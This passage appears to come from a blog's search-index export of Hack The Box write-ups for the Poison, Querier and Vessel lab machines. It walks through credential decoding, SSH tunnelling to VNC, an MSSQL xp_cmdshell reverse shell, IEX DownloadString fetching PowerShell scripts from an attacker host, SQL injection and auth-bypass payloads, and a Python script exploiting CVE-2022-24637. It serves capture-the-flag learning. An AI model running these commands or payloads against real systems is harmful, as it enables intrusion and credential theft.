VVRKb2FHTnRiRFJKVkVscVRrTlZNa3BxWjI5TlFUMDlDZz09Cg== [root:/git/htb/poison]# echo “VVRKb2FHTnRiRFJKVkVscVRrTlZNa3BxWjI5TlFUMDlDZz09Cg==” | base64 –decode (master✱) UTJoaGNtbDRJVElqTkNVMkpqZ29NQT09Cg== [root:/git/htb/poison]# echo “UTJoaGNtbDRJVElqTkNVMkpqZ29NQT09Cg==” | base64 –decode (master✱) Q2hhcml4ITIjNCU2JjgoMA== [root:/git/htb/poison]# echo “Q2hhcml4ITIjNCU2JjgoMA==” | base64 –decode (master✱) Charix!2#4%6&8(0\n[root:/git/htb/poison]# ssh charix@poison.htb (master✱) Password for charix@Poison: Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4 FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017\nWelcome to FreeBSD!\n— snip —\nEdit /etc/motd to change this login announcement. The default editor in FreeBSD is vi, which is efficient to use when you have learned it, but somewhat user-unfriendly. To use ee (an easier but less powerful editor) instead, set the environment variable EDITOR to /usr/bin/ee\ncharix@Poison:~ % id uid=1001(charix) gid=1001(charix) groups=1001(charix) charix@Poison:~ % cat user.txt eaacdfb2d141b72a589233063604209c\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n[root:/git/htb/poison]# nc -lp 4488 &gt; secret.zip charix@Poison:~ % nc -w 3 10.10.14.12 4488 &lt; secret.zip [root:/git/htb/poison]# 7z e secret.zip (master✱)\nScanning the drive for archives: 1 file, 166 bytes (1 KiB)"
  },
  {
    "objectID": "posts/2021-03-11-htb-writeup-poison/2021-03-11-htb-writeup-poison.html#extracting-archive-secret.zip",
    "href": "posts/2021-03-11-htb-writeup-poison/2021-03-11-htb-writeup-poison.html#extracting-archive-secret.zip",
    "title": "Poison - Hack The Box",
    "section": "Extracting archive: secret.zip",
    "text": "Extracting archive: secret.zip\nPath = secret.zip Type = zip Physical Size = 166\nEnter password (will not be echoed): Charix!2#4%6&8(0 Everything is Ok\nSize: 8 Compressed: 166\n[root:/git/htb/poison]# ls -al (master✱) — snip — -r–r–r– 1 root root 8 Jan 24 2018 secret [root:/git/htb/poison]# cat secret (master✱) ��[|Ֆz!# [root:/git/htb/poison]# strings secret [root:/git/htb/poison]# file -i secret (master✱) secret: text/plain; charset=unknown-8bit [root:/git/htb/poison]# file -b secret (master✱) Non-ISO extended-ASCII text, with no line terminators\nOpening the file in gui text editor and going to ‘save as’ says that the Character Encoding is ‘Western (ISO-8859-15)’. Change the encoding to UTF-8 and save as ‘secret-utf8’.\n[root:/git/htb/poison]# cat secret-utf8 (master✱) œš[|Õz!\n[root:/git/htb/poison]# for i in $(cat result.txt | grep ok: | awk ‘{print $1}’); do (master✱) for&gt; printf “writing \\(i to loop.out\\n\"\nfor&gt; printf \"\\n\\)i:” &gt;&gt; loop.out for&gt; iconv -f $i -t UTF-8 secret &gt;&gt; loop.out for&gt; done\nAfter looking through all data in loop.out, none of it makes sense. This is probably a rabbit hole.\n\nRunning linpeas.sh we find a few things that sticks out.\n\n====================================( Available Software )==================================== [+] Useful software — snip — /usr/local/bin/xterm\n================================( Processes, Cron, Services, Timers & Sockets )================================ [+] Cleaned processes — snip — root 529 0.0 0.9 23620 8868 v0- I 13:43 0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xautho root 540 0.0 0.7 67220 7064 v0- I 13:43 0:00.02 xterm -geometry 80x24+10+10 -ls -title X Desktop\nLinpeas fails to provide us with a list of open sockets / ports, grab that ourselves. charix@Poison:/tmp % sockstat -4 -l USER COMMAND PID FD PROTO LOCAL ADDRESS FOREIGN ADDRESS www httpd 735 4 tcp4 :80 : root sendmail 672 3 tcp4 127.0.0.1:25 : www httpd 671 4 tcp4 :80 : www httpd 670 4 tcp4 :80 : www httpd 669 4 tcp4 :80 : www httpd 668 4 tcp4 :80 : www httpd 667 4 tcp4 :80 : root httpd 655 4 tcp4 :80 : root sshd 620 4 tcp4 :22 : root Xvnc 529 1 tcp4 127.0.0.1:5901 : root Xvnc 529 3 tcp4 127.0.0.1:5801 : root syslogd 390 7 udp4 :514 :*\n\nWe are unable to SSH from the victim back to us (-R), so lets to a local (-L) port tunnel.\n\n[root:/git/htb/poison]# ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84 (master✱) Password for charix@Poison: Charix!2#4%6&8(0\nThe tunnel is setup and we can verify it using lsof: [root:/opt]# sudo lsof -i -P -n | grep LISTEN — snip — ssh 29038 root 4u IPv6 592189 0t0 TCP [::1]:5901 (LISTEN) ssh 29038 root 5u IPv4 592190 0t0 TCP 127.0.0.1:5901 (LISTEN\nWe know that the service is vnc, so connect to it using vncviewer: [root:/opt]# vncviewer 127.0.0.1:5901 Connected to RFB server, using protocol version 3.8 Enabling TightVNC protocol extensions Performing standard VNC authentication Password: Charix!2#4%6&8(0 Authentication failed\nLooking further into vncviewer the flag ‘-passwd’ can be used for password files, maybe the unknown file is a pass file? [root:/opt]# vncviewer –help — snip — -passwd  (standard VNC authentication)\n[root:/git/htb/poison]# vncviewer 127.0.0.1:5901 -passwd secret (master✱) Connected to RFB server, using protocol version 3.8 Enabling TightVNC protocol extensions Performing standard VNC authentication Authentication successful Desktop name “root’s X desktop (Poison:1)” VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Using default colormap which is TrueColor. Pixel format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Same machine: preferring raw encoding\nroot@Poison:~ # id uid=0(root) gid=0(wheel) groups=0(wheel),5(operator) root@Poison:~ # cat root.txt 716d04b188419cf2bb99d891272361f5\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nFreeBSD Listening Ports: https://www.cyberciti.biz/tips/freebsd-lists-open-internet-unix-domain-sockets.html\nSSH Port Tunneling: https://www.ssh.com/ssh/tunneling/example"
  },
  {
    "objectID": "posts/2019-06-01-htb-writeup-querier/2019-06-01-htb-writeup-querier.html",
    "href": "posts/2019-06-01-htb-writeup-querier/2019-06-01-htb-writeup-querier.html",
    "title": "Querier - Hack The Box",
    "section": "",
    "text": "USER\nLISTENER:\npython smbserver.py -smb2support -ip 10.10.14.3 reporting /tmp \nRUN:\npython mssqlclient.py -windows-auth querier/reporting:PcwTWTHRwryjc\\$c6@10.10.10.125\nSQL&gt; EXEC master.sys.xp_dirtree '\\\\10.10.14.3\\tmp'\nConnect with credentials:\npython mssqlclient.py querier/mssql-svc:corporate568@10.10.10.125 -windows-auth\n\n&gt; xp_cmdshell type C:\\Users\\mssql-svc\\Desktop\\user.txt\n\n\n\nROOT\nStart smbserver and netcat listener:\n$ python smbserver.py -smb2support -ip 10.10.14.11 querier /tmp\n$ nc -lnvp 4444\nGet reverse shell with PowerShellTcp:\nSQL &gt; xp_cmdshell move \\\\10.10.14.11\\querier\\Invoke-PowerShellTcp.ps1 C:\\Users\\mssql-svc\\Desktop\\pENIS.ps1\nSQL &gt; xp_cmdshell \"powershell -file c:\\Users\\mssql-svc\\Desktop\\pENIS.ps1 -Reverse -IPAddress 10.10.14.11 -Port 4444\"\n\nPS &gt; IEX (New-Object Net.WebClient).DownloadString('\\\\10.10.14.11\\querier\\PowerUp.ps1'); Invoke-AllChecks\n [*] Checking for cached Group Policy Preferences .xml files....\n Usernames : {Administrator}\n Passwords : {MyUnclesAreMarioAndLuigi!!1!}\nGrab flag:\n$ python smbclient.py querier/Administrator:MyUnclesAreMarioAndLuigi\\!\\!1\\!@10.10.10.125\n$ use C$\n$ cd Users/Administrator/Desktop\n$ get root.txt"
  },
  {
    "objectID": "posts/2022-09-02-htb-writeup-vessel/2022-09-02-htb-writeup-vessel.html",
    "href": "posts/2022-09-02-htb-writeup-vessel/2022-09-02-htb-writeup-vessel.html",
    "title": "Vessel - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\n➜  vessel nmap -Pn -n -p- 10.10.11.178\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 09:37 CEST\nNmap scan report for 10.10.11.178\nHost is up (0.031s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\n➜  vessel nmap -Pn -n -sCV -p22,80 10.10.11.178\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 38:c2:97:32:7b:9e:c5:65:b4:4b:4e:a3:30:a5:9a:a5 (RSA)\n|   256 33:b3:55:f4:a1:7f:f8:4e:48:da:c5:29:63:13:83:3d (ECDSA)\n|_  256 a1:f1:88:1c:3a:39:72:74:e6:30:1f:28:b6:80:25:4e (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Vessel\n|_http-trane-info: Problem with XML parsing of /evox/about\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\ndirb:\n➜  vessel dirb http://10.10.11.178\n\nSTART_TIME: Mon Aug 29 09:39:29 2022\nURL_BASE: http://10.10.11.178/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n-----------------\n\nGENERATED WORDS: 4612                                                          \n\n---- Scanning URL: http://10.10.11.178/ ----\n+ http://10.10.11.178/401 (CODE:200|SIZE:2400)                                                                                                               \n+ http://10.10.11.178/404 (CODE:200|SIZE:2393)                                                                                                               \n+ http://10.10.11.178/500 (CODE:200|SIZE:2335)                                                                                                               \n+ http://10.10.11.178/admin (CODE:302|SIZE:28)                                                                                                               \n+ http://10.10.11.178/Admin (CODE:302|SIZE:28)                                                                                                               \n+ http://10.10.11.178/ADMIN (CODE:302|SIZE:28)                                                                                                               \n+ http://10.10.11.178/charts (CODE:302|SIZE:26)                                                                                                              \n+ http://10.10.11.178/css (CODE:301|SIZE:173)                                                                                                                \n+ http://10.10.11.178/dev (CODE:301|SIZE:173)                                                                                                                \n+ http://10.10.11.178/img (CODE:301|SIZE:173)                                                                                                                \n+ http://10.10.11.178/js (CODE:301|SIZE:171)                                                                                                                 \n+ http://10.10.11.178/login (CODE:200|SIZE:4213)                                                                                                             \n+ http://10.10.11.178/Login (CODE:200|SIZE:4213)                                                                                                             \n+ http://10.10.11.178/logout (CODE:302|SIZE:28)                                                                                                              \n+ http://10.10.11.178/register (CODE:200|SIZE:5830)                                                                                                          \n+ http://10.10.11.178/server-status (CODE:403|SIZE:277)  \n➜  webanalyze ./webanalyze -host http://vessel.htb\nhttp://vessel.htb (0.2s):\n    Apache, 2.4.41 (Web servers)\n    Ubuntu,  (Operating systems)\n    Google Font API,  (Font scripts)\n    Lightbox,  (JavaScript libraries)\n    Express,  (Web frameworks, Web servers)\n    Node.js,  (Programming languages)\n➜  vessel ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://vessel.htb -H \"Host: FUZZ.vessel.htb\" -fw 5599\nN/A\nVisiting port 80 we find vessel.htb in the footer, add it to /etc/hosts.\nTrying to create an account we get the response “Currently not available!”, and looking in the HTTP POST the body is empty.\n\n\nSame thing goes for the Password Recovery function - “Currently not available!” and no data in the POST body.\n\n\nChanging focus to the login function. Testing different SQL Injection payloads we get the response “Wrong credentials! Try Again!” several times, example:\nRequest: username=admin' or '1'='1'#&password=pass'\nRespone: Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!\n\nRequest: username=admin\" or \"1\"=\"1\"/*&password=pass'\nResponse: Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!\n\nRequest: username=admin\" or \"1\"=\"1\"--&password=pass'\nResponse:Wrong credentials! Try Again!,Wrong credentials! Try Again!\nGoogling about nodejs sql injection I come across this post explaining a authentication bypass technique. TLDR;\nusername=admin&password[password]=1\nWill bypass authentication and generate a admin cookie.\n\nAdd the cookie to your local storage and browse to http://vessel.htb/admin and continue enumerating.\nPressing Analytics from the drop down bar in the top right corener forwards us to openwebanalytics.vessel.htb - add it to /etc/hosts\n\n\n\nStep 2\n➜  vessel ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://openwebanalytics.vessel.htb/FUZZ -b \"connect.sid=s%3AHesPODZMoKvc6J1HoyB3bOrgfQ94Oist.EJSYnEx%2Bzt9qCM4jC0sFUQiTfiZEWZf0AkfHELtFuaI\" -fs 26\n.htaccess               [Status: 403, Size: 292, Words: 20, Lines: 10, Duration: 3231ms]\n.htpasswd               [Status: 403, Size: 292, Words: 20, Lines: 10, Duration: 3567ms]\napi                     [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 28ms]\nconf                    [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 33ms]\nincludes                [Status: 301, Size: 345, Words: 20, Lines: 10, Duration: 34ms]\nmodules                 [Status: 301, Size: 344, Words: 20, Lines: 10, Duration: 28ms]\nplugins                 [Status: 301, Size: 344, Words: 20, Lines: 10, Duration: 29ms]\nserver-status           [Status: 403, Size: 292, Words: 20, Lines: 10, Duration: 30ms]\nvendor                  [Status: 301, Size: 343, Words: 20, Lines: 10, Duration: 33ms]\nLooking on the source code we see that it’s running version 1.7.3:\n&lt;LINK REL=StyleSheet HREF=\"http://openwebanalytics.vessel.htb/modules/base/css/owa.css?version=1.7.3\" TYPE=\"text/css\"&gt;\nReading about version 1.7.3 I come across this post covering CVE-2022-24637 where use of single quotes cause sensitive information to be printed in the php cache file. The cache files are stored here: http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/\nAnd when no cache file is present we see this empty directory:\n\nA cache file is generated once a user logs in to the application, and at the same time index.php is also generated to hide the files in the directory. We can generate cache files by doing invalid logins, however since index.php is created all we see is a blank page. We need to find a way to calculate the name of the cache file, and luckily it is quiet simple.\nHere’s a short script I made to calculate the file name, and do a GET request to capture the base64 encoded data\n#!/usr/bin/env python3\nfrom hashlib import md5\nimport requests\n\nuser_id = 1\nwhile (user_id &lt; 10):\n    unhashed_key = \"user_id\" + str(user_id)\n    cache_filename = md5(unhashed_key.encode()).hexdigest() + \".php\"\n    url = \"http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/\" + cache_filename\n\n    print(user_id, \"=\", url)\n\n    r = requests.session().get(url)\n    if r.status_code != 404:\n        print(r.content)\n        break\n    user_id = user_id + 1\nRunning the script returns:\n➜  vessel ./get-cache-file.py \n1 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php\n2 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/ee140b966fcc6e58868032d658ae518e.php\n3 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/333a7b2c4fe7e6a9e1028a51df3816d3.php\n4 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/761b16cfc8c4c438b5cd6974f3313b91.php\n5 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/277eabec41d80d89bc280c5b88ca18a8.php\n6 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/f00dc1ccf8f0214684cd1b3722648bfd.php\n7 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/8c43aebbdb615fce9c93df72bb956116.php\n8 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/39e2305c9e511e28167c2b8644daf256.php\n9 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/40f0efb1108be4366e279bb71efbed16.php\nHowever, as mentioned earlier, if we do a invalid login as user admin and run the script again, we’ll get the secret base64 data.\n➜  vessel ./get-cache-file.py\n1 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php\nb'&lt;?php\\\\n/*Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI7czo5OiJkYXRhX3R5cGUiO3M6NjoiU0VSSUFMIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjc6InVzZXJfaWQiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjoxO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjg6InBhc3N3b3JkIjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO047czo1OiJ2YWx1ZSI7czo2MDoiJDJ5JDEwJG0wTDdwbVhiS054dlJWcUpIR1dKWS40a3ZxM0hsaEhjYlZoakFxRGt6b1pjVnUvc3c0UENXIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjQ6InJvbGUiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjk6InJlYWxfbmFtZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTM6ImRlZmF1bHQgYWRtaW4iO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fXM6MTM6ImVtYWlsX2FkZHJlc3MiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjE2OiJhZG1pbkB2ZXNzZWwuaHRiIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjEyOiJ0ZW1wX3Bhc3NrZXkiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjMyOiJjYzI1YzYzOWY0Mzk1MTA5ZTAzODE3ODRiN2VjODQwZSI7czo5OiJkYXRhX3R5cGUiO3M6MTI6IlZBUkNIQVIoMjU1KSI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxMzoiY3JlYXRpb25fZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxNjoibGFzdF91cGRhdGVfZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czo3OiJhcGlfa2V5IjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO3M6NzoiYXBpX2tleSI7czo1OiJ2YWx1ZSI7czozMjoiYTM5MGNjMDI0N2VjYWRhOWEyYjhkMjMzOGI5Y2E2ZDIiO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fX1zOjE2OiJfdGFibGVQcm9wZXJ0aWVzIjthOjQ6e3M6NToiYWxpYXMiO3M6NDoidXNlciI7czo0OiJuYW1lIjtzOjg6Im93YV91c2VyIjtzOjk6ImNhY2hlYWJsZSI7YjoxO3M6MjM6ImNhY2hlX2V4cGlyYXRpb25fcGVyaW9kIjtpOjYwNDgwMDt9czoxMjoid2FzUGVyc2lzdGVkIjtiOjE7czo1OiJjYWNoZSI7Tjt9*/\\\\n?&gt;'\n\n➜  vessel echo \"Tzo [... snip ...] Tjt9\" | base64 -d\nO:8:\"owa_user\":5:{s:4:\"name\";s:9:\"base.user\";s:10:\"properties\";a:10:{s:2:\"id\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:1:\"1\";s:9:\"data_type\";s:6:\"SERIAL\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:7:\"user_id\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:5:\"admin\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:1;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:8:\"password\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:60:\"$2y$10$m0L7pmXbKNxvRVqJHGWJY.4kvq3HlhHcbVhjAqDkzoZcVu/sw4PCW\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:4:\"role\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:5:\"admin\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:9:\"real_name\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:13:\"default admin\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:13:\"email_address\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:16:\"admin@vessel.htb\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:12:\"temp_passkey\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:32:\"cc25c639f4395109e0381784b7ec840e\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:13:\"creation_date\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:10:\"1650211659\";s:9:\"data_type\";s:6:\"BIGINT\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:16:\"last_update_date\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:10:\"1650211659\";s:9:\"data_type\";s:6:\"BIGINT\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:7:\"api_key\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";s:7:\"api_key\";s:5:\"value\";s:32:\"a390cc0247ecada9a2b8d2338b9ca6d2\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}}s:16:\"_tableP